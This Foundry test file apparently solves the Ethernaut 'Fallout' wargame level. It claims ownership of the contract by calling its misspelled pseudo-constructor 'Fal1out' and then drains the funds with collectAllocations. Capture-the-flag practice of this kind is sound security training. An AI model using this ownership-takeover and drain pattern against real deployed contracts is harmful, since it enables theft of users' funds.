// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallout.sol";
import "src/levels/FalloutFactory.sol";

contract TestFallout is BaseTest {
    Fallout private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FalloutFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallout(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        /** CODE YOUR EXPLOIT HERE */
        // https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5
        // run with: `forge test --match-contract Fallout -vv`

        // bad constructor implementation and typos...
        emit log_named_address("Owner", level.owner());

        level.Fal1out{value: 1 wei}();
        emit log_named_address("Owner", level.owner());

        // let's emty the allocations now that we are owners
        level.collectAllocations();

        vm.stopPrank();
    }
}
